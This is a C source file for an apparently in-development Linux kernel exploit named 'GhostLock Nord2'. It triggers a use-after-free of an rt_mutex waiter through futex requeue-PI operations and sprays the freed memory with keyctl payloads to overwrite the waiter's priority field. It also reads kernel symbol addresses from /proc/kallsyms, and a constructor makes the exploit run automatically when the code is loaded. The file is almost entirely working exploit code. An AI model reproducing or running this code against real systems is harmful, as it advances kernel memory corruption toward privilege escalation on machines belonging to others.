/*
 * GhostLock Nord2 - Minimal PRIO-ONLY spray test
 *
 * The freed waiter already has VALID task and lock pointers.
 * We ONLY need to change waiter->prio from 50 to our sentinel.
 * All other fields remain from the freed stack (valid).
 *
 * Strategy: fill keyctl payload with zeros (doesn't overwrite anything useful)
 * EXCEPT at offset 0x18 from every possible 8-byte waiter start.
 * Those 4-byte positions get SENTINEL=99.
 *
 * Expected: if keyctl lands at waiter, prio becomes 99 → /proc shows -100.
 * The task/lock fields remain valid from freed stack → NO CRASH.
 *
 * The rest of the keyctl data is 0. When the chain walk reads waiter->task (at+0x50)
 * and waiter->lock (at+0x58) from the freed stack (original values), it proceeds safely.
 * Only prio is changed.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include <linux/futex.h>
#include <time.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_add_key
#define SYS_add_key 217
#endif
#ifndef SYS_keyctl
#define SYS_keyctl 219
#endif
#define KEYCTL_UPDATE     2
#define KEYCTL_INVALIDATE 22
#define KPSZ 4096
#define SENTINEL 99  /* expect /proc prio = -100 */

static uint32_t f_wait=0, f_pi_target=0, f_pi_chain=0;
static atomic_int g_tid=0, g_ready=0, g_waiting=0;
static atomic_int g_owner_started=0, g_owner_done=0;
static atomic_int g_do_spray=0, g_spray_done=0;
static atomic_int g_stop_owner=0;

static uint64_t read_sym(const char *nm){
    FILE *f=fopen("/proc/kallsyms","r"); if(!f) return 0;
    uint64_t a=0; char t[8],s[256];
    while(fscanf(f,"%llx %s %255s",(unsigned long long*)&a,t,s)==3)
        if(!strcmp(s,nm)){fclose(f);return a;}
    fclose(f); return 0;
}
static int get_prio(pid_t tid){
    char p[64]; snprintf(p,sizeof(p),"/proc/%d/stat",(int)tid);
    FILE *f=fopen(p,"r"); if(!f) return -999;
    int pid; char c[256]; char st; long tmp;
    fscanf(f,"%d %s %c",&pid,c,&st);
    for(int i=0;i<14;i++) fscanf(f," %ld",&tmp);
    int prio=-999; fscanf(f," %d",&prio); fclose(f); return prio;
}

void *owner_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_ready)) usleep(500);
    atomic_store(&g_owner_started,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_owner_done,1);
    while(!atomic_load(&g_stop_owner)){
        syscall(SYS_futex,&f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
        syscall(SYS_futex,&f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
        usleep(50);
    }
    return NULL;
}

void *waiter_fn(void *_){
    (void)_;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&g_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&g_ready,1);
    while(!atomic_load(&g_owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=60;
    atomic_store(&g_waiting,1);
    syscall(SYS_futex,&f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&f_pi_target,0);
    while(!atomic_load(&g_do_spray)) usleep(50);

    /* MINIMAL spray: zeros everywhere EXCEPT prio field (+0x18 from waiter start) */
    uint8_t kp[KPSZ];
    memset(kp, 0, KPSZ);
    /* Place SENTINEL at offset 0x18 from every possible 8-byte aligned waiter start */
    for(int s=0; s+0x18+4<=KPSZ; s+=8)
        *(int32_t*)(kp+s+0x18) = SENTINEL;

    int keyid=(int)syscall(SYS_add_key,"user","gl_p",kp,(size_t)KPSZ,(unsigned int)-4);
    if(keyid>0){
        for(int r=0;r<256;r++)
            syscall(SYS_keyctl,(long)KEYCTL_UPDATE,(long)keyid,(long)kp,(size_t)KPSZ,0L);
        syscall(SYS_keyctl,(long)KEYCTL_INVALIDATE,(long)keyid,0L,0L,0L);
    }

    atomic_store(&g_spray_done,1);
    syscall(SYS_futex,&f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while(!atomic_load(&g_owner_done)) usleep(500);
    return NULL;
}

int main(void){
    setvbuf(stderr,NULL,_IONBF,0);
    fprintf(stderr,"=== GhostLock Nord2 - Minimal Prio Spray ===\n");
    uint64_t stext=read_sym("_stext");
    if(!stext){fprintf(stderr,"[!] kptr_restrict\n");return 1;}
    fprintf(stderr,"[*] stext=%llx sentinel=%d (expect prio=-%d)\n",
            (unsigned long long)stext, SENTINEL, SENTINEL+1);
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(2,&cs); sched_setaffinity(0,sizeof(cs),&cs);

    for(int att=0;att<50;att++){
        f_wait=0; f_pi_target=0; f_pi_chain=0;
        atomic_store(&g_tid,0); atomic_store(&g_ready,0);
        atomic_store(&g_waiting,0); atomic_store(&g_owner_started,0);
        atomic_store(&g_owner_done,0);
        atomic_store(&g_do_spray,0); atomic_store(&g_spray_done,0);
        atomic_store(&g_stop_owner,0);

        pthread_t ot,wt;
        pthread_create(&ot,NULL,owner_fn,NULL);
        pthread_create(&wt,NULL,waiter_fn,NULL);
        while(!atomic_load(&g_waiting)||!atomic_load(&g_owner_started)) usleep(500);
        usleep(5000);

        syscall(SYS_futex,&f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&f_pi_target,0);
        usleep(1000);
        atomic_store(&g_do_spray,1);
        while(!atomic_load(&g_spray_done)) usleep(500);
        usleep(50000);

        atomic_store(&g_stop_owner,1);
        pthread_detach(ot); pthread_detach(wt);

        pid_t tid=(pid_t)atomic_load(&g_tid);
        int p=get_prio(tid);
        fprintf(stderr,"[att=%d] prio=%d%s\n",att,p,
                (p < -1 && p != -51 && p != -999) ? " ← DIFFERENT!" : "");
        usleep(10000);
    }
    return 0;
}
__attribute__((constructor)) static void _init(void){main();}
